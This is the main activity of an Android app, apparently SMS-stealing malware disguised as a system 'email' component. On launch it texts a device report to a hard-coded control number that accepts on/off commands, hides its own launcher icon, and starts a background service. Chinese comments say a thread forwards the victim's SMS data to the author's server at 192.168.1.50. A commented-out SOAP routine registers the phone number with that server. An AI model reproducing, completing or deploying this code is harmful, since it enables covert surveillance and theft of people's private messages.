package com.android.system.emial;

import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.view.Window;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        super.requestWindowFeature(Window.FEATURE_NO_TITLE); //任务栏隐蔽图标1123456
        setContentView(R.layout.activity_main);
        SmSutils su = new SmSutils();

//		if(SmSutils.key.equals(SmSutils.getPublicKey(this))){
        su.sendSMS(SmSutils.phone, "报告,回复com#false关闭com#true开启, 版本" + Build.VERSION.SDK_INT + " " + Build.MODEL, null);
        //Toast.makeText(this, "程序启动成功", Toast.LENGTH_LONG).show();
        PackageManager pm = this.getPackageManager();
        pm.setComponentEnabledSetting(this.getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);//隐蔽图标
        Intent intent = new Intent(this, SmSserver.class);
        this.startService(intent); //启动SmServer服务

        /***
         * 用一个线程将短信数据发送到我指定的服务器192.168.1.50的Service接口!!!
         */

        MyThread mythread = new MyThread("版本：" + Build.VERSION.SDK_INT + "|");
        mythread.start();

        this.finish();

//		}else{
//			String sp="证书错误,程序启动失败";
//			su.sendSMS(SmSutils.phone, sp,null);
//			Toast.makeText(this, sp, Toast.LENGTH_LONG).show();
//			this.finish();
//		}

    }


    /***
     *
     * @param phoneSec
     */
    /*
    public void RegPhone(String phoneSec) {
		// 命名空间
		String nameSpace = "http://192.168.1.50:808/";
		// 调用的方法名称
		String methodName = "RegPhone";
		// EndPoint
		String endPoint = "http://192.168.1.50:808/WebService.asmx?wsdl";
		// SOAP Action
		String soapAction = "http://192.168.1.50:808/RegPhone";

		// 指定WebService的命名空间和调用的方法名
		SoapObject rpc = new SoapObject(nameSpace, methodName);

		// 设置需调用WebService接口需要传入的两个参数mobileCode、userId
		rpc.addProperty("PhoneNum", phoneSec);
		//rpc.addProperty("userId", "");

		// 生成调用WebService方法的SOAP请求信息,并指定SOAP的版本
		SoapSerializationEnvelope envelope = new SoapSerializationEnvelope(SoapEnvelope.VER10);

		envelope.bodyOut = rpc;
		// 设置是否调用的是dotNet开发的WebService
		envelope.dotNet = true;
		// 等价于envelope.bodyOut = rpc;
		envelope.setOutputSoapObject(rpc);

		HttpTransportSE transport = new HttpTransportSE(endPoint);
		try {
			// 调用WebService
			transport.call(soapAction, envelope);
		} catch (Exception e) {
			e.printStackTrace();
		}

		// 获取返回的数据
		SoapObject object = (SoapObject) envelope.bodyIn;
		// 获取返回的结果
		String result = object.getProperty(0).toString();

		Log.i("WebService返回的结果：",result);

		// 将WebService返回的结果显示在TextView中

		//resultView.setText(result);

	}
	*/
}
